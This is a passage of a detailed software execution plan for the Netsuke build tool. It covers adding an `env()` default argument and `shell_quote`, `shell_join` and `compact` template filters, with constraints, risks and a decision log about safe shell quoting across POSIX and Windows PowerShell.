# Make Jinja command helpers match the documented ergonomics (3.14.8)

This ExecPlan (execution plan) is a living document. The sections `Constraints`,
`Tolerances (exception triggers)`, `Risks`, `Progress`,
`Surprises & discoveries`, `Decision log`, `Outcomes & retrospective`,
`Conformance basis`, and `Verification plan` must be kept up to date as work
proceeds.

Status: COMPLETE

## Purpose / big picture

Netsuke manifests are YAML documents whose string fields are rendered as Jinja
templates before the build graph is built. Netsuke's design documents promise
four template helpers that do not exist in the code: an `env()` function that
accepts a fallback value, a filter that makes an arbitrary string safe to paste
into a shell recipe, a filter that turns a list into a safe command fragment,
and a filter that drops empty entries from a list. Today `env('X')` fails the
whole build when `X` is unset, and there is no supported way to quote a value,
so manifest authors reach for shell parameter expansion such as
`${RUSTFLAGS:+$RUSTFLAGS }` inside recipes. That is exactly the construct
Netsuke's Ninja backend has to escape around, and it does not work at all on
Windows, where recipes run under Windows PowerShell.

After this change a manifest author can write, in a `Netsukefile`:

```yaml
# POSIX recipe shell (`sh`). The `VAR=value cmd` prefix and `&&` below are
# POSIX forms: a Windows PowerShell manifest sets `$env:RUSTFLAGS` before the
# command and chains with `if ($?) { ... }`, and quotes for `dialect='powershell'`.
targets:
  - name: build-stamp
    command: >-
      RUSTFLAGS={{ [base_flags, env('RUSTFLAGS', default='')]
        | compact | join(' ') | shell_quote(dialect='sh') }}
      cargo build && touch {{ outs }}
```

Two details of that example are load-bearing and were wrong in the first draft
of this plan.

- The interpolation sits in **unquoted** position. `shell_quote` produces a
  complete shell word; putting it inside `"..."` would insert its quote
  characters literally and corrupt the value. This is a precondition of the
  filter, not a stylistic choice, and it is documented as such.
- The recipe is **POSIX-only, and the example says so**. `VAR=value cmd` is a
  POSIX prefix assignment that Windows PowerShell does not accept, so this
  example was never portable to PowerShell however its commands were chained —
  `touch` is likewise not a Windows command. `docs/users-guide.md:365-366`
  states the Windows contract is Windows PowerShell, "not a PowerShell Core
  (`pwsh`) contract"; the comment above the snippet gives that dialect's
  equivalents, and the example pins `dialect='sh'` explicitly because D10
  requires a pinned dialect for byte-stable output. Within a POSIX shell `&&`
  is available and is used, so a failed `cargo build` does not create the
  stamp. The first draft used `;` and justified it as keeping the example
  runnable on Windows; that rationale was false — `;` made the recipe's exit
  status that of `touch`, so the build failure was swallowed and the stamp was
  written anyway. The cross-dialect requirement is real for *other* recipes,
  and it is why `dialect` defaults to the active `RecipeShell` (D2) rather than
  always to `sh`.

Given that manifest, observe that:

1. `netsuke generate` succeeds whether or not `RUSTFLAGS` is set in the
   environment.
2. When `RUSTFLAGS` is unset, the generated `build.ninja` carries
   `RUSTFLAGS=-D' warnings'` — one shell word, no empty argument, and no
   `${...:+...}` expansion. That spelling is the `shell-quote` crate's
   fragmented form; see the note under the behavioural specification.
3. When `RUSTFLAGS` is set to `-C target-cpu=native --cfg 'a b'`, the generated
   command still contains exactly one shell word for the value, and running the
   build passes that exact string to `cargo` rather than word-splitting it.
4. The `shell_escape` filter that the user guide currently describes as "not
   implemented" no longer appears anywhere; the guide names `shell_quote`, and
   `shell_quote` exists.

The observable acceptance is behavioural, not structural: a documented,
executed example in `docs/stdlib-yaml-and-jinja-guide.md` builds this exact
manifest and asserts the generated Ninja text.

## Context and orientation

Read this section before touching anything. It assumes no prior knowledge of
this repository.

### What Netsuke does

Netsuke reads a YAML manifest (`Netsukefile`), renders every string field as a
Jinja template using the [MiniJinja](https://docs.rs/minijinja) crate, lowers
the result into an intermediate representation (IR), and writes a `build.ninja`
file that the [Ninja](https://ninja-build.org/) build tool executes. "Jinja" is
a template language; a *filter* is written `value | name(arguments)` and a
*function* is written `name(arguments)`.

### Where the template helpers live

There are three registration surfaces, all reachable from
`src/manifest/mod.rs::from_str_named` (lines 107-178):

1. `src/manifest/mod.rs:137-139` registers `env` and `glob` directly on the
   `minijinja::Environment`. These two names are manifest-loader-owned, not
   part of the standard library, and are listed in `RESERVED_VAR_NAMES`
   (`src/manifest/mod.rs:191-198`) so a manifest `vars:` entry cannot shadow
   them.
2. `src/stdlib/register.rs::register_with_config` (line 101) wires the full
   standard library: file tests, path filters, collection filters, time
   functions, network functions, command wrappers, and the `which` family.
3. `src/stdlib/register.rs::register_manifest_query` (line 135) wires a
   restricted, side-effect-free subset used when rendering discovery metadata
   for `netsuke help targets`. It does not merely omit the unsafe helpers: it
   re-registers each one with a stub that always fails
   (`register_always_disabled_query_helpers`, line 172, and
   `register_host_dependent_query_helpers`, line 213). `env` is one of those
   stubs, at `src/stdlib/register.rs:181-184`.

There is **no test asserting parity** between surfaces 2 and 3. Adding a helper
to one and forgetting the other is caught only by review. This plan adds
targeted coverage for the four helpers it introduces; a general parity test is
out of scope.

### How `env()` works today

`src/manifest/mod.rs:134-139`:

```rust
let reader = Arc::clone(env_reader);
jinja.add_function("env", move |var_name: String| {
    env_var_with(&var_name, |key| reader(key))
});
```

`EnvReader` is `Arc<dyn Fn(&str) -> Result<String, EnvReadError> + Send + Sync>`
(`src/manifest/env_reader.rs:61`). It exists because Netsuke forbids reading
`std::env::var` outside a thin injected seam; see
`docs/adr-008-environment-seam-taxonomy.md`, which names this exact site as the
canonical `Arc`-closure seam (the `Arc` is required because MiniJinja's
`add_function` demands `Send + Sync`).

`env_var_with` (`src/manifest/env_reader.rs:133-172`) maps the failure modes.
There are now **three**, not two: since commit `0ba6672f` the ADR-026 access
policy is evaluated first, so a blocked name is a fourth outcome alongside the
two `EnvReadError` variants, and the reader is never called for it.

```rust
Err(EnvReadError::NotPresent) => {
    tracing::debug!(failure_kind = "not_present", "manifest env lookup failed");
    Err(Error::new(
        ErrorKind::UndefinedError,
        localization::message(keys::MANIFEST_ENV_MISSING).to_string(),
    ))
}
Err(EnvReadError::NotUnicode) => {
    tracing::debug!(failure_kind = "not_unicode", "manifest env lookup failed");
    Err(Error::new(
        ErrorKind::InvalidOperation,
        localization::message(keys::MANIFEST_ENV_INVALID_UTF8).to_string(),
    ))
}
```

Neither message names the variable, deliberately: the doc comment at
`src/manifest/env_reader.rs:121-127` explains that variable names "routinely
identify credentials". Two `insta` snapshots pin the rendered strings exactly,
at `tests/manifest_env_tests.rs:108-122`:

```text
undefined value: A required environment variable is not set. (in <string>:1)
invalid operation: An environment variable contains invalid UTF-8. (in <string>:1)
```

An existing unit test, `empty_value_is_returned_rather_than_treated_as_missing`
(`src/manifest/tests/env_function.rs`), pins that an empty string is a *value*,
not an absence.

### Which shell actually runs a recipe

This is the single most important fact for the quoting design, and it is not
what a reader would assume.

`src/recipe_shell.rs` defines:

```rust
pub enum RecipeShell {
    /// Use the host POSIX shell through Ninja's ordinary Unix execution path.
    Posix,
    /// Use Windows PowerShell with an encoded script argument.
    PowerShell,
    /// Use an explicitly selected Bash compatibility runtime on Windows.
    Bash,
}

impl RecipeShell {
    pub(crate) const fn host_default() -> Self {
        if cfg!(windows) { Self::PowerShell } else { Self::Posix }
    }
}
```

On Windows, Netsuke wraps every recipe as
`powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass
-EncodedCommand <base64>`
(`src/ninja_gen_recipe_shell.rs:16-17`). It never uses `cmd.exe`.
`docs/users-guide.md:331-399` ("Windows legacy recipe contract") states this
normatively. On Unix the command is emitted bare for Ninja to run through its
own POSIX path.

A Windows user may set `NETSUKE_WINDOWS_SHELL=bash` to select an explicit Bash
compatibility runtime (`src/runner/recipe_shell.rs:24-58`). The runner resolves
this once, before dispatch (`src/runner/mod.rs:130-160`), and threads the
result through `ExecutionContext.graph_generation.recipe_shell` into IR lowering
(`src/runner/generation.rs:41-66`) and Ninja generation
(`src/runner/generation.rs:128-145`).

Consequently, POSIX `sh` quoting is correct for `RecipeShell::Posix` and
`RecipeShell::Bash`, and **wrong** for `RecipeShell::PowerShell`.

### The quoting that already exists

There are **five** distinct encoders today, not three. Getting this inventory
right matters, because the plan's central promise is that it adds none.
`docs/developers-guide.md:445-458` documents only the last three.

1. `src/ir/cmd_interpolate/mod.rs::quote_path` (lines 137-150) quotes
   `{{ ins }}` and `{{ outs }}` for the selected `RecipeShell` in an
   **unquoted** recipe context:

   ```rust
   fn quote_path(path: &Utf8PathBuf, shell: RecipeShell) -> String {
       if shell == RecipeShell::PowerShell {
           return format!("'{}'", path.as_str().replace('\'', "''"));
       }
       // Utf8PathBuf guarantees UTF-8, and shell quoting should preserve it.
       let bytes: Vec<u8> = path.as_str().quoted(Sh);
       match String::from_utf8(bytes) { /* ... */ }
   }
   ```

   This is the semantics the new template helpers need, and **this one encoder
   is the only one this plan extracts.**

2. `PathSubstitutions::new` (`src/ir/cmd_interpolate/mod.rs:82-103`) builds a
   `single_quoted` variant by `path.replace('\'', "'\"'\"'")`, for a
   placeholder appearing inside existing single quotes.

3. `quote_double_quoted_path` (`src/ir/cmd_interpolate/mod.rs:154-163`)
   backslash-escapes `\`, `"`, `$`, and `` ` `` for a placeholder inside
   existing double quotes.

   Encoders 2 and 3 are *context* encoders for the same POSIX shell. They are
   out of scope: they solve a different problem (splicing into a surrounding
   quote) from the one the template filters solve (producing a complete word).

4. `src/stdlib/command/quote.rs::quote` is `#[cfg(windows)]`/
   `#[cfg(not(windows))]` and produces `cmd.exe` quoting on Windows. It
   supports the `shell` and `grep` template filters, which *spawn a process*
   through the platform shell at manifest-render time. It is not exposed to
   templates and must keep its `cmd.exe` behaviour.

5. `shell_single_quote` in the Ninja command-list renderer produces a canonical
   single-quoted `eval` payload. `docs/developers-guide.md:449-454` explicitly
   says to keep it local and not generalize it.

The `shell-quote` crate is pinned at `Cargo.toml:137` with
`default-features = false, features = ["sh"]`, so only the `Sh` dialect is
compiled in. `Sh::quoted` returns `Vec<u8>` (not `String`), which is why both
call sites convert.

### What the documentation currently promises

`docs/netsuke-design.md` §4.4 (lines 1263-1346) specifies
`env(var_name, default: Option<String>)` and says the `default` argument is
"planned". §4.5 (lines 1347-1373) specifies three unimplemented filters:

- `| shell_escape`: "takes a string or list and escapes it for safe inclusion
  as a single argument in a shell command … a non-negotiable security feature".
- `| shell_join`: "accepts a list of arguments and returns one shell-safe
  command fragment. Each list element is quoted as a separate argument."
- `| compact`: "removes empty strings and null values while preserving order.
  It supports patterns such as constructing `RUSTFLAGS` from an optional user
  override without handwritten shell tests."

`docs/users-guide.md:489-491` says "The `shell_escape` filter described in
older drafts is not implemented in beta3."
`docs/stdlib-yaml-and-jinja-guide.md:341-343` says `env(name)` has "no
default-value argument".

`docs/rfcs/0006-ansible-inspired-template-standard-library.md:1393-1409`
supersedes the `shell_escape` name:

> `text | shell_quote(dialect='sh')` … **This is the same capability as the
> `shell_escape` helper documented but unimplemented today**, which roadmap task
> 3.14.8 exists to resolve. That task remains the owner and ships first; this
> RFC contributes only the canonical name and the `dialect` argument.

`docs/netsuke-design.md:681-690` already writes the target ergonomics into an
illustrative manifest:

```yaml
RUSTFLAGS: >-
  {{ [rust_flags, env('RUST_FLAGS', default='')] | compact | join(' ') }}
```

### Localization is a hard gate

Every user-facing string is a Fluent message. Adding one means:

1. adding a constant to the `define_keys!` block in
   `src/localization/keys.rs`, and
2. adding the message to **all 35** catalogues under
   `locales/<tag>/messages.ftl` with an identical `{ $variable }` name set.

`build.rs:291` calls `build_l10n_audit::audit_localization_keys()`
unconditionally. Missing a catalogue fails `cargo build` — not a test, the
build — with one `- missing in <tag>: <key>` line per locale. See
`docs/developers-guide.md:285-302` and `docs/translators-guide.md`.

### Testing infrastructure

- Unit and integration tests run under `cargo-nextest` (`make test-nextest`),
  which gives each test its own process. Doctests run separately
  (`make doctest`). `make test` is both.
- `proptest` is used widely. The house idiom is a `proptest!` block opening
  with an inner attribute that sets `ProptestConfig { cases: 128, .. }` — see
  `src/ninja_gen_property_tests/dependency_only.rs` in full. Regression seeds
  live under `proptest-regressions/`, mirroring the `src/` path.
- `rstest-bdd` feature files live in `tests/features/*.feature` and are
  auto-discovered by `scenarios!("tests/features", ...)` in
  `tests/bdd_tests.rs`. **New `.feature` files need no registration**; new step
  *modules* need a `mod` line in `tests/bdd/steps/mod.rs`.
  `tests/features/stdlib.feature` and `tests/bdd/steps/stdlib/` are the
  existing template-helper suite.
- `insta` snapshots live in `src/snapshots/<subdir>/` and
  `tests/snapshots/<subdir>/`, with the path set explicitly via
  `Settings::set_snapshot_path`.
- `googletest` matchers (`assert_that!(x, contains_substring(y))`) and
  `pretty_assertions::assert_eq` are both in use; see
  `src/cli/discovery_layer_tests.rs:10-11` and lines 140-178.
- **Documented examples are executed.** A fenced block in `README.md`,
  `docs/users-guide.md`, or `docs/stdlib-yaml-and-jinja-guide.md` must be
  preceded by `<!-- tested-example: <id> -->`. The loader is
  `tests/documentation_examples/mod.rs`; the id must also be added to
  `EXPECTED_EXAMPLE_IDS` in `tests/documentation_examples_tests.rs:18-61` or
  the suite fails with "documented example registry drifted". YAML examples are
  run as real manifests via `manifest_workspace(id)`.
- `tests/integration_test_wiring_tests.rs` asserts every `tests/<dir>/mod.rs`
  tree is declared by some top-level `tests/*.rs`, and that Cargo discovers
  every top-level integration-test source.

### Non-negotiable house rules that bear on this work

From `AGENTS.md` and `docs/adr-008-environment-seam-taxonomy.md`:

- In-process environment mutation is forbidden in tests. Inject `EnvReader`,
  `mockable::Env`, or a narrow closure seam. `serial_test` and process-wide
  locks are not an escape hatch.
- No file may exceed 400 lines.
- Every module needs a `//!` comment; every function, public or private, needs
  a `///` comment. `make doc-coverage` enforces an 80% aggregate.
- The toolchain enables the Polonius borrow checker and the next-generation
  trait solver. Do not add NLL-era workarounds (double lookups,
  `entry(key.clone())`, defensive `.clone()`), and do not add `-Z` flags.
- Markdown prose wraps at 80 columns; code blocks at 120. `make check-fmt`
  enforces `mdtablefix`-canonical Markdown. `make markdownlint` runs `typos`
  with en-GB-oxendict (Oxford) spelling; backtick technical identifiers rather
  than widening the accepted-word list.

### Applicability of `ortho_config`

`ortho_config` provides layered configuration with localized help. This change
adds no command-line flag and no configuration key: the recipe-shell selection
it depends on is already resolved from `NETSUKE_WINDOWS_SHELL` in
`src/runner/recipe_shell.rs`, which is a runner-level environment seam, not a
configuration layer. `ortho_config` is therefore **not used** by this work. If
a reviewer believes a `dialect` default belongs in project configuration, that
is a scope change: stop and escalate rather than adding a configuration key.

## Conformance basis

There is no Terms of Reference artefact in this repository. The upstream
artefacts are:

| Identifier      | Artefact                                                     | Revision anchor      |
| --------------- | ------------------------------------------------------------ | -------------------- |
| `RM-3.14.8`     | `docs/roadmap.md` lines 367-380                              | at commit `ebcedaef` |
| `RM-6.8.3`      | `docs/roadmap.md` lines 1189-1196                            | at commit `ebcedaef` |
| `DD-4.4`        | `docs/netsuke-design.md` §4.4, lines 1272-1355               | at commit `ebcedaef` |
| `DD-4.5`        | `docs/netsuke-design.md` §4.5, lines 1356-1382               | at commit `ebcedaef` |
| `DD-2.6`        | `docs/netsuke-design.md` §2.6, lines 602-749                 | at commit `ebcedaef` |
| `RFC-0006-8.9`  | `docs/rfcs/0006-…md` lines 1396-1412                         | at commit `ebcedaef` |
| `RFC-0006-13.3` | `docs/rfcs/0006-…md` line 1837                               | at commit `ebcedaef` |
| `ADR-008`       | `docs/adr-008-environment-seam-taxonomy.md`                  | Accepted 2026-08-06  |
| `ADR-014`       | `docs/adr-014-backend-text-escaping-seam.md`                 | Accepted             |
| `ADR-026`       | `docs/adr-026-manifest-environment-access-policy.md`         | Accepted 2026-09-17  |
| `UG-WIN`        | `docs/users-guide.md:358-485` Windows legacy recipe contract | at commit `ebcedaef` |

The anchors were re-taken against commit `0ba6672f` after the branch rebased
onto `origin/main`. The pre-rebase anchors (`81d44f89`) have moved: `RM-3.14.8`
was at 282-295, `RM-6.8.3` at 1103-1110, `DD-4.4` at 1233-1307, `DD-4.5` at
1309-1334, `DD-2.6` at 630-700, and `UG-WIN` at 330-348. `RFC-0006-8.9` and
`RFC-0006-13.3` did not move.

A second rebase moved the base on to `ebcedaef` (the `origin/main` head), and
every reference anchor was re-taken against it. The deltas are not uniform —
the roadmap moved by +24 and +27, the design document by a flat +9, the RFC by
a flat +3 — so nothing was extrapolated; each anchor was re-measured by content.
`DD-2.6`, `DD-4.4`, `DD-4.5`, and both RFC citations were confirmed by diffing
the cited body between the two commits: all four design sections and both RFC
spans are byte-identical, so only the offset moved. `DD-4.5`'s end is the full
section (`### 4.6` follows at 1383), not a truncation, so 1382 is simply 1373
shifted.

`UG-WIN` is the one anchor whose *span* changed rather than just shifting. At
`0ba6672f` the plan's 331-399 was already a truncation: the section
(`### Windows legacy recipe contract`) ran 331-458, and 399 was merely the
sentence "do not rely on a workflow-wide `shell: bash` setting." The section
body is byte-identical between the two commits, so the faithful shift of that
truncation would be 358-426. The table instead records 358-485, the full
section, because the section end is the stronger anchor and the terminal line
was an arbitrary stopping point rather than a cited claim.

Every citation in this plan that names a document line number is therefore in
the `ebcedaef` frame; a citation whose file has since grown is a pointer, not a
claim, and the section heading is authoritative.

Those anchors were **not** re-taken again at the `ebcedaef` rebase, and the
distinction matters. A citation into a *reference* document — an ADR, a design
chapter, the roadmap — is a pointer whose target the plan does not control, so
re-taking it after upstream moves the file is the honest repair. A citation
into a line of **this branch's own source** is a different object: it names a
line this branch wrote, so a drift there means the branch's own commit changed
shape and is a finding rather than housekeeping. Both `cmd_interpolate/mod.rs`
and `ninja_gen_escape.rs` are files the branch edits, and both were re-checked
against post-rebase `HEAD`: `validate_ninja_value` stayed at
`src/ninja_gen_escape.rs:47`, and `quote_path` moved `138` → `137` solely
because upstream's version of `cmd_interpolate/mod.rs` carries a three-line
module header where the merge-base had four. That citation was corrected in
place; the absence of any other correction is the claim that no other
branch-owned line number moved.

`ADR-026` is a new upstream artefact for this plan. It bounds the `env()` port
that EP-M1 extends and is the governing decision for `EnvAccessPolicy`.

Predecessors `2.2.4` (archived,
`docs/archive/roadmap-completed-foundations.md:125`) and `3.14.4`
(`docs/roadmap.md:307`) are both complete, so `RM-3.14.8` is unblocked.

Trace chain:

```plaintext
RM-3.14.8 -> DD-4.4 + ADR-026 -> EP-M1
    -> tests::manifest_env::env_default_cases
    (constraint 12: a blocked name is not an absence and takes no default)
RM-3.14.8 -> DD-4.5 (compact) -> EP-M2 -> tests::std_filter::compact_property
RM-3.14.8 -> DD-4.5 (shell_escape) + RFC-0006-8.9 -> EP-M3, EP-M4
    -> tests::shell_quote::sh_roundtrip_property
RM-3.14.8 -> DD-4.5 (shell_join) -> EP-M4 -> tests::shell_join::shlex_roundtrip
UG-WIN + ADR-014 -> EP-M3, EP-M4 -> tests::shell_quote::dialect_follows_recipe_shell
RM-3.14.8 (RUSTFLAGS) -> DD-2.6 -> EP-M5
    -> tests::documentation_examples::stdlib-optional-rustflags-manifest
RM-6.8.3 -> EP-M3 (name and dialect adopted early) -> ADR-041
```

## Constraints

These are hard invariants. Violating one requires escalation, not a workaround.

1. The rendered text of the two existing `env()` diagnostics must not change.
   `tests/manifest_env_tests.rs:108-122` holds `insta` inline snapshots of
   both; they must still pass **without being re-accepted**. Absence with no
   default stays `ErrorKind::UndefinedError`; a non-UTF-8 value stays
   `ErrorKind::InvalidOperation` *even when a default is supplied*.
2. An environment variable whose value is the empty string is a value, not an
   absence. `default` must never replace it.
3. Generated Ninja text for every existing manifest must remain byte-identical.
   No `.snap` file under `tests/snapshots/ninja/` may change.
4. Exactly one implementation of recipe-shell word quoting may exist. The
   `cmd.exe` quoting in `src/stdlib/command/quote.rs` and the `eval`-payload
   `shell_single_quote` are separate, documented paths and must keep their
   current behaviour; do not fold them in and do not add a fourth.
5. No test may call `std::env::set_var` or `remove_var`, directly or through a
   helper, and no production code may call `std::env::var`/`var_os` outside an
   injected seam. `clippy.toml` already denies these.
6. Every new user-facing string is a Fluent message present in all 35
   catalogues with a matching `{ $variable }` set.
7. Two contracts are in scope and they are governed differently.
   **(a) The Rust API** — `StdlibConfig`, `netsuke::manifest::*`,
   `RecipeShell` — is pre-1.0 with no external consumers, so changes are
   permitted, no compatibility alias or deprecated entry point may be added,
   and every caller is updated in the same change. **(b) The Jinja template
   surface** — helper names, argument names, and rendered output — is a
   user-facing contract independent of the crate version. A `Netsukefile` is
   written by people who never see the crate. Nothing in this plan removes or
   renames a template name any manifest can be using: `shell_escape` is
   documented but has never existed, which Stage A step 1 verifies. Any future
   change to a *shipped* template name or its output needs a deprecation path,
   and none exists yet. Whether `netsuke_version` should gate the template
   surface is an open question this plan does not answer.
8. No file exceeds 400 lines. No `-Z` compiler flag is added anywhere.
9. `make check-fmt`, `make typecheck`, `make lint`, `make doc-coverage`, and
   `make test` must all pass at every milestone boundary.
10. `shell_quote` and `shell_join` must never emit a dialect that differs from
    the interpreter which will execute the recipe. This is the whole point of
    the feature; see the silent-corruption path in R11.
11. Changes under `locales/**` are never "docs-only" for gating purposes. The
    localization audit runs in `build.rs`, so a gate that skips the Rust build
    for a translation-only diff would skip the audit that protects it.
12. `env(name, default=…)` must not weaken the ADR-026 access policy. A name
    the policy blocks fails, with or without a `default`. A `default` is
    substituted for *absence* only, and a policy denial is not an absence. This
    constraint was added during post-rebase reconciliation: the plan's original
    `env_var_with` signature had no policy parameter, so the interaction did not
    exist when the plan was written, and a naive implementation would map
    `NotPresent` to the fallback before consulting the policy. A blocked name
    must also stay absent from every diagnostic and from the substituted value.
13. Every new metric series must be admitted by `ConfigMetricsRecorder` in
    `src/observability_recorder.rs` — both its `matches!` name list and its
    `exact_labels` vocabulary — or it is silently dropped as a noop handle.
    This is the same class of failure as constraint 6's missing catalogue
    entry, but it fails *quietly*: the build, the lint, and the tests all pass
    while the counter records nothing. See EP-M5's counters step.

## Tolerances (exception triggers)

Stop and escalate — do not improvise — when any of these is reached.

1. **Scope**: more than 50 non-generated files changed, or more than 1000 net
   added lines outside `locales/` and `docs/`. (The 35 catalogues alone
   contribute roughly 385 lines; they do not count against this.)
2. **Interface**: a public signature outside `src/manifest/`,
   `src/stdlib/config/`, and the manifest-loading entry points must change; or
   `RESERVED_VAR_NAMES` must grow. EP-M4's runner plumbing changes the
   manifest-loading signatures; that breach is foreseen, recorded in EP-M4, and
   needs no escalation. Any *further* public signature change does.
3. **Dependencies**: any new entry in `Cargo.toml`. The plan needs none:
   `shell-quote`, `shlex`, `proptest`, `rstest`, `rstest-bdd`, `insta`,
   `googletest`, `pretty_assertions`, and `mockable` are all present.
4. **Behaviour**: any existing `.snap` file requires re-acceptance, or any
   existing test requires modification beyond adding cases.
5. **Iterations**: a gate still fails after 3 focused fix attempts on the same
   milestone.
6. **Time**: a single milestone exceeds 6 hours of work.
7. **Ambiguity**: a second reading of `RFC-0006-8.9` or `DD-4.5` would produce a
   materially different template surface.
8. **Verification**: the real-shell round-trip property (OBL-SH-ROUNDTRIP)
   cannot be made to run in the sandbox, or its negative control passes.

## Risks

- **R1 — Translation burden.** Eleven new message keys across 35 catalogues is
  roughly 385 handwritten lines, and `build.rs` fails the build for any
  omission. Severity: medium. Likelihood: high. Mitigation: add every key and
  every catalogue entry in one commit per milestone that introduces them; follow
  `docs/localization-styleguide.md` and `docs/translators-guide.md` §5 for
  variable usage; copy the bracketed `[netsuke::jinja::…]` code verbatim into
  each translation, as `locales/fr/messages.ftl:343-347` does; run
  `cargo build` (not just `cargo check`) to trigger the audit early. Decision
  D11 records the alternative that would cut this to one key.
- **R2 — Refactoring `quote_path` changes generated Ninja.** Extracting the
  quoting into a shared module could alter bytes. Severity: high. Likelihood:
  low. Mitigation: the extraction is a pure move. Before and after, run
  `make test-nextest` and confirm
  `git status --short tests/snapshots src/snapshots` is empty. Constraint 3
  makes any diff an escalation.
- **R3 — RFC 0006 is being restructured concurrently.** Branch
  `6-1-1-split-rfc-0006-set-into-focused-child-rfcs-and-task` exists on the
  remote and touches the same RFC. Severity: medium. Likelihood: medium.
  Mitigation: keep the RFC 0006 edit to the two paragraphs at lines 1393-1409
  and 1834; rebase onto `origin/main` immediately before requesting review; if
  the RFC has been split by then, apply the same edit to whichever child RFC
  owns §8.9 and record the redirection in `Decision log`.
- **R4 — Host-dependent filter output breaks snapshots.** `shell_quote` with no
  explicit `dialect` produces different text on Windows. Severity: medium.
  Likelihood: high if unguarded. Mitigation: every snapshot and every
  documented example passes an explicit `dialect`, or is gated with
  `#[cfg(unix)]`. The host-default behaviour is covered only by tests that
  assert *which dialect was selected*, not its output.
- **R5 — Subprocess property tests are slow. Measured: they are not.**
  Severity: low. Likelihood: low. Evidence: 64 real `sh -c 'printf %s x'`
  invocations complete in about 86 ms on this machine, and one `sh -c` costs
  roughly 1 ms. Even at five times that, to allow for `std::process::Command`
  overhead and case generation, 64 cases land near half a second — two orders
  of magnitude under the 10-second budget and far under nextest's 60-second
  slow-test threshold. Mitigation: keep `cases: 64` for the subprocess property
  and the house default of 128 for the pure `shlex` properties, and do **not**
  build a batching harness. Batching would break proptest's per-case shrinking,
  which needs to re-run one input in isolation to minimize a counterexample.
- **R6 — Documentation gates.** `typos` enforces Oxford spelling over Markdown;
  `mdtablefix` enforces canonical tables; `make fmt` reformats unrelated files
  if they were already non-canonical. Severity: low. Likelihood: medium.
  Mitigation: run `make fmt` then inspect `git diff --stat`; if files unrelated
  to this change are reformatted, commit that reformatting separately and note
  it in `Surprises & discoveries`.
- **R7 — Doc-comment coverage.** Every new function, public or private, needs a
  `///` comment or `make doc-coverage` drops below 80%. Severity: low.
  Likelihood: medium. Mitigation: write the doc comment with the function, not
  afterwards.
- **R8 — Manifest-query surface drift. Realized, and one instance fixed.**
  There is no parity test between `register_with_config` and
  `register_manifest_query`. Severity: medium. Likelihood: medium — confirmed,
  not merely estimated. Mitigation: EP-M2 and EP-M4 each add an explicit
  manifest-query test for the helper they introduce, and EP-M1 adds one proving
  the disabled `env` stub still reports "disabled", not an argument-count
  error, when called with `default=`. The likelihood was upgraded from an
  estimate to a fact when the `is <kind>` file tests were found to be
  registered on the build surface and absent from the query surface, so
  `'x' is file` failed as "unknown test" — and the case asserting otherwise
  passed anyway. Stubs for the seven file tests are now registered from the
  parent's own `FILE_TESTS` list, which removes this instance and makes the
  next one impossible to add silently; the residual risk is any *future* helper
  registered on one surface only, which a stub list cannot cover.

- **R9 — Collision with in-flight budget work. Resolved as a convergence.**
  The remote branch
  `issue-651-add-resource-budgets-to-manifest-template-evaluation` restructured
  the exact files this plan edits: `src/manifest/mod.rs`,
  `src/manifest/query.rs`, `src/manifest/render.rs`; it split
  `src/manifest/expand.rs` into a directory module and added
  `src/manifest/registration.rs` with the same four members this plan extracts.
  **That branch has now landed on `origin/main` at commit `0ba6672f`, together
  with the environment-policy and resource-ceiling work (ADR-026).**
  `src/manifest/registration.rs` exists and already carries exactly the planned
  member set — `RESERVED_VAR_NAMES`, `localize_recipe_error`,
  `register_manifest_vars`, `manifest_structure_error` — so the extraction step
  is a no-op and the plan's choice of module name and member set was correct.
  What remains is to move the `env` and `glob` registrations from
  `src/manifest/mod.rs` into that module. Severity: low (was medium).
  Likelihood: certain (was high). Mitigation: EP-M1 now *extends* the existing
  module rather than creating it. A second consequence is recorded in
  `Surprises & discoveries`: the landed branch supplies the manifest-load seam
  (`ManifestLoadInputs`, `ManifestEnvironment`, `EnvAccessPolicy`) that EP-M4
  must thread the resolved shell through, rather than a parallel one.
  `shell_join` and `compact` are unbounded by design here; the landed budget
  ceilings (`evaluation_fuel`, `rendered_value_bytes`, `foreach_cardinality`)
  now bound a pathological `shell_join` in general terms, but no per-filter
  length ceiling is added by this plan.
- **R10 — `env(default=)` converts a loud failure into a silent one.** Today a
  missing variable fails the build immediately; afterwards a manifest can
  silently take a default, so a continuous-integration job whose `RUSTFLAGS`
  export stops propagating builds the wrong artefact instead of failing fast.
  Severity: medium. Likelihood: medium. Mitigation: emit
  `tracing::debug!(fallback_used = true, ...)` on the substitution path, naming
  neither variable nor value, matching the existing failure-path logging and
  the redaction rule at `src/manifest/env_reader.rs:121-127`. Roadmap 3.14.11
  sets the precedent that a manifest-time decision changing build behaviour
  belongs in verbose diagnostics. Document in the user guide that `default=''`
  trades fail-fast for tolerance, and that a value which must be present should
  omit `default`.
- **R11 — Dialect and interpreter mismatch corrupts silently.** If the filters'
  dialect can differ from the interpreter that runs the recipe, the failure is
  silent rather than loud. Concretely: PowerShell quoting doubles an embedded
  single quote, so `a'b` becomes `'a''b'`; fed to a POSIX-family shell that is
  two adjacent single-quoted strings concatenated, evaluating to `ab`. It is
  syntactically valid, so `shlex::split` accepts it and the IR guard has
  nothing to object to. `netsuke build` succeeds and the artefact is wrong.
  Severity: high. Likelihood: medium if the milestones are separable.
  Mitigation: constraint 10, discharged by fusing the filter registration and
  the runner plumbing into one milestone so no shipped commit can contain the
  divergence. OBL-COMPOSITION exercises the composed path per interpreter.
- **R12 — `is_valid_command_for_shell` does not guard PowerShell.**
  `src/ir/cmd_interpolate/mod.rs:226-231` returns `true` unconditionally for
  `RecipeShell::PowerShell`, so there is no structural validation of a
  PowerShell recipe at all. This plan does not introduce the gap but routes new
  traffic through it. Severity: medium. Likelihood: low. Mitigation:
  OBL-COMPOSITION asserts the PowerShell path end to end rather than relying on
  a guard that is not there. Closing the guard itself is out of scope; record
  it as a follow-up roadmap candidate in `Outcomes & retrospective`.

## Decision log

- **Decision D1**: Ship the helper as `shell_quote`, not `shell_escape`, and
  rewrite every `shell_escape` reference in `docs/netsuke-design.md` §4.5,
  `docs/users-guide.md:489-491`, `docs/netsuke-design.md:687-688`, and
  `docs/netsuke-design.md:3876-3877` to name `shell_quote`. Rationale:
  `RFC-0006-13.3` states that roadmap 3.14.8 "owns the shell-quoting capability
  and ships first" and that the RFC "contributes the canonical name
  `shell_quote` and the `dialect` argument; the roadmap task should adopt them
  so the two do not diverge". `RM-6.8.3` repeats this. Shipping `shell_escape`
  now would put a known-superseded name on the public template surface and
  force a breaking rename later. `RM-3.14.8` explicitly permits "implement **or
